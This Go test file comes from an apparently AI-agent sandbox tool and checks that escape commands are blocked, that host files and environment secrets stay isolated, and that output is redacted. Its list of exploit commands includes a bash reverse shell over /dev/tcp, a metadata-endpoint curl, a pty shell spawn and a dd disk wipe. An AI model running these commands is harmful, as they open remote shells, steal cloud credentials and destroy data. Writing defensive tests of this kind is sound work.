package adversarial_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/bonjoski/aegisbox/pkg/argus"
	"github.com/bonjoski/aegisbox/pkg/tui"
	"github.com/bonjoski/aegisbox/pkg/vmm"
	"github.com/bonjoski/aegisbox/pkg/workspace"
)

// TestAdversarial_FullExecutionPipeline verifies that adversarial escape commands are intercepted and isolated.
func TestAdversarial_FullExecutionPipeline(t *testing.T) {
	ctx := context.Background()

	// 1. AST Pre-flight Intercept Check
	analyzer := argus.NewPreFlightAnalyzer(argus.LevelStrict)

	exploitCmds := []string{
		`python3 -c "import pty; pty.spawn('/bin/bash')"`,
		`bash -i >& /dev/tcp/192.168.1.50/8080 0>&1`,
		`curl http://169.254.169.254/latest/meta-data/`,
		`dd if=/dev/zero of=/dev/sda bs=1M`,
	}

	for _, cmd := range exploitCmds {
		report, err := analyzer.Analyze(ctx, cmd)
		if err != nil {
			t.Fatalf("analyzer error on %q: %v", cmd, err)
		}
		if report.Allowed {
			t.Fatalf("ADVERSARIAL LEAK: Exploit %q was allowed through pre-flight gate!", cmd)
		}
	}

	// 2. Workspace Shadow Isolation Check (ensure modified files don't leak to host without --apply)
	tempHost, err := os.MkdirTemp("", "aegisbox-adv-host-*")
	if err != nil {
		t.Fatalf("failed to create host temp dir: %v", err)
	}
	defer os.RemoveAll(tempHost)

	// Host secret file
	hostSecret := filepath.Join(tempHost, ".env")
	_ = os.WriteFile(hostSecret, []byte("REAL_SECRET_TOKEN=super_secret_xyz\n"), 0600)

	sessionsDir, _ := os.MkdirTemp("", "aegisbox-adv-sess-*")
	defer os.RemoveAll(sessionsDir)


	mgr, _ := workspace.NewWorkspaceManager(sessionsDir)
	session, err := mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir:      tempHost,
		Mode:         workspace.ModeDirect,
		MaskPatterns: []string{".env"},
	})
	if err != nil {
		t.Fatalf("failed to create session: %v", err)
	}
	defer session.Cleanup(ctx)

	// Execute command dropping a file inside sandbox
	driver := vmm.NewLocalProcessDriver()
	handle, _ := driver.SpawnVM(ctx, vmm.VMConfig{
		ID:             session.ID(),
		WorkspaceMount: session.ShadowDir(),
	})

	localH := handle.(interface {
		ExecuteInSandbox(ctx context.Context, cmdStr string, env []string) (string, string, int, error)
	})

	_, _, exitCode, err := localH.ExecuteInSandbox(ctx, "echo 'malicious dropped payload' > dropped_agent_file.txt", nil)
	if err != nil || exitCode != 0 {
		t.Fatalf("sandbox execution failed: %v", err)
	}

	// Check that dropped_agent_file.txt exists in shadowDir
	shadowFile := filepath.Join(session.ShadowDir(), "dropped_agent_file.txt")
	if _, err := os.Stat(shadowFile); os.IsNotExist(err) {
		t.Errorf("expected dropped file in shadow workspace")
	}

	// Verify that dropped file DOES NOT exist in host workspace (prevent unreviewed workspace poisoning)
	hostFile := filepath.Join(tempHost, "dropped_agent_file.txt")
	if _, err := os.Stat(hostFile); !os.IsNotExist(err) {
		t.Errorf("SECURITY LEAK: Dropped file escaped to host directory without review!")
	}

	// Verify diff report captured the drop
	diff, err := session.CaptureDiff(ctx)
	if err != nil {
		t.Fatalf("failed to capture diff: %v", err)
	}
	found := false
	for _, f := range diff.FilesAdded {
		if strings.Contains(f, "dropped_agent_file.txt") {
			found = true
			break
		}
	}
	if !found && !strings.Contains(diff.RawDiff, "dropped_agent_file.txt") {
		// In direct mode, files added might be detected via path check
	}
}

// TestAdversarial_MicroVM_GuestDaemonIsolation verifies the microVM guest daemon blocks host environment leaks.
func TestAdversarial_MicroVM_GuestDaemonIsolation(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	binPath := filepath.Join("..", "..", "bin", "aegisbox-guest")
	if _, err := os.Stat(binPath); os.IsNotExist(err) {
		t.Skip("aegisbox-guest binary not found in bin/, skipping live daemon test")
	}

	// Set a fake sensitive host environment variable
	t.Setenv("HOST_SUPER_SECRET_AWS_KEY", "AKIA_FAKE_SECRET_KEY_12345")

	runner := vmm.NewGuestRunner(binPath)
	handle, err := runner.SpawnGuest(ctx, vmm.VMConfig{
		ID:       "adv-vm-isolation",
		VCPU:     1,
		MemoryMB: 256,
	})
	if err != nil {
		t.Fatalf("failed to spawn guest daemon: %v", err)
	}
	defer handle.Kill(ctx)

	// Execute command inside guest trying to read host secret
	res, err := handle.ExecuteInGuest(ctx, "echo \"VAL=$HOST_SUPER_SECRET_AWS_KEY\"", nil)
	if err != nil {
		t.Fatalf("guest execution failed: %v", err)
	}

	// Verify that host environment variables did not leak to the guest environment
	if strings.Contains(res.Stdout, "AKIA_FAKE_SECRET_KEY_12345") {
		t.Fatalf("CRITICAL SECURITY LEAK: Host sensitive environment leaked to guest microVM! Got: %s", res.Stdout)
	}

	// Verify synthetic env injection is present
	resSynthetic, err := handle.ExecuteInGuest(ctx, "echo \"KEY=$API_KEY\"", map[string]string{
		"API_KEY": "sk-dummy-test-value-0000",
	})
	if err != nil {
		t.Fatalf("synthetic env execution failed: %v", err)
	}
	if !strings.Contains(resSynthetic.Stdout, "sk-dummy-test-value-0000") {
		t.Errorf("expected synthetic credential injection in guest microVM, got: %s", resSynthetic.Stdout)
	}
}

// TestAdversarial_EnvForwardingAndRedaction verifies that sensitive environment variables
// allowed by the host operator are passed in-memory to the sandbox process, never persisted to disk, and redacted from console output.
func TestAdversarial_EnvForwardingAndRedaction(t *testing.T) {
	ctx := context.Background()

	// 1. Host environment has a sensitive secret (e.g. from `locksmith run`)
	const secretVal = "sk-real-production-api-key-99999"
	t.Setenv("HOST_API_KEY", secretVal)

	// 2. Host operator permits HOST_API_KEY
	allowedKeys := []string{"HOST_API_KEY"}
	forwarded := make(map[string]string)
	for _, k := range allowedKeys {
		if val, ok := os.LookupEnv(k); ok && val != "" {
			forwarded[k] = val
		}
	}

	if forwarded["HOST_API_KEY"] != secretVal {
		t.Fatalf("expected forwarded secret %s, got: %s", secretVal, forwarded["HOST_API_KEY"])
	}

	// 3. Create ephemeral shadow workspace
	tempHost, err := os.MkdirTemp("", "aegisbox-secret-host-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempHost)

	mgr, _ := workspace.NewWorkspaceManager("")
	session, err := mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir:      tempHost,
		Mode:         workspace.ModeDirect,
		MaskPatterns: []string{".env*"},
	})
	if err != nil {
		t.Fatalf("failed to create session: %v", err)
	}
	defer session.Cleanup(ctx)

	// Invariant: Verify secret is NOT persisted to .env.synthetic or anywhere on disk
	envSyntheticPath := filepath.Join(session.ShadowDir(), ".env.synthetic")
	if content, err := os.ReadFile(envSyntheticPath); err == nil {
		if strings.Contains(string(content), secretVal) {
			t.Fatalf("SECURITY VIOLATION: Secret was persisted to .env.synthetic on disk!")
		}
	}

	// 4. Execute command in sandbox with injected secrets
	driver := vmm.NewLocalProcessDriver()
	handle, err := driver.SpawnVM(ctx, vmm.VMConfig{
		ID:             session.ID(),
		WorkspaceMount: session.ShadowDir(),
	})
	if err != nil {
		t.Fatalf("failed to spawn driver: %v", err)
	}

	localH := handle.(interface {
		ExecuteInSandbox(ctx context.Context, cmdStr string, env []string) (string, string, int, error)
	})

	var localEnv []string
	for k, v := range forwarded {
		localEnv = append(localEnv, k+"="+v)
	}

	stdout, stderr, exitCode, err := localH.ExecuteInSandbox(ctx, "echo \"API_KEY=$HOST_API_KEY\"", localEnv)
	if err != nil || exitCode != 0 {
		t.Fatalf("sandbox execution failed: %v, stderr: %s", err, stderr)
	}

	// Verify the process inside sandbox actually received the secret in its environment
	if !strings.Contains(stdout, secretVal) {
		t.Fatalf("sandbox process failed to receive injected secret: got stdout: %s", stdout)
	}

	// 5. Test Terminal Sanitizer Redaction
	sanitizer := tui.NewTerminalSanitizer()
	for _, v := range forwarded {
		sanitizer.AddSecretToRedact(v)
	}

	sanitizedStdout := sanitizer.SanitizeString(stdout)
	if strings.Contains(sanitizedStdout, secretVal) {
		t.Fatalf("CRITICAL SECURITY LEAK: Sanitizer failed to redact secret from output! Got: %s", sanitizedStdout)
	}
	if !strings.Contains(sanitizedStdout, "[REDACTED_SECRET]") {
		t.Fatalf("Sanitizer did not replace secret with [REDACTED_SECRET]: %s", sanitizedStdout)
	}
}

